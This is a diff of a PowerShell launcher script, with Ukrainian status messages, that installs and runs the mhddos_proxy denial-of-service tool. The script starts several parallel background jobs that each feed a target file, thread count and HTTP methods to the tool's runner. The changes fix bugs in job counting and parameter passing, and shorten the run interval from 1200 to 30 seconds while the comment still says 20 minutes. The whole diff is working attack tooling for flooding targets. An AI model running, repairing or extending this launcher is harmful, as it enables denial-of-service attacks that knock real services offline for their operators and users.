@@ -78,10 +78,11 @@ Write-MiddleHost "Завантаження додаткових компонен
 &"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet
 
 #Write-MiddleHost "Запуск mhddos_proxy" -Here -NoNewline
+$strMethods = "$methods"
 $BackgroundJob = { 
     $StartParams = @{
         'FilePath' = "$PyPath\python.exe"
-        'ArgumentList' = "$LocalMhddosProxy\runner.py -c $using:FilePath -t $using:threads --http-methods $using:methods"
+        'ArgumentList' = "$LocalMhddosProxy\runner.py -c $using:FilePath -t $using:threads --http-methods $using:strMethods"
         'NoNewWindow' = $true
         'PassThru' = $true
         'Wait' = $true
@@ -93,14 +94,15 @@ try {
     $JobCount = 0
     [System.Collections.ArrayList]$jobList = @()
     foreach ($targetFile in $TargetFiles) {
+        $JobCount++
         $FilePath = "$RootPath\tmp\$targetFile"
         Write-MiddleHost "Запуск Multidd$JobCount"
         $Multidd = Start-ThreadJob -ScriptBlock $BackgroundJob -Name "Multidd$JobCount"
-        Receive-Job -Job $Multidd -Keep | Format-Table
-        $jobList.Add( $Multidd )
+        Receive-Job -Job $Multidd -Keep
+        $null = $jobList.Add( $Multidd )
     }
     $Multidd = $null
-    Start-Sleep -Seconds 1200 # wait for 20 minutes
+    Start-Sleep -Seconds 30 # wait for 20 minutes
 }
 catch { $_ }
 finally {
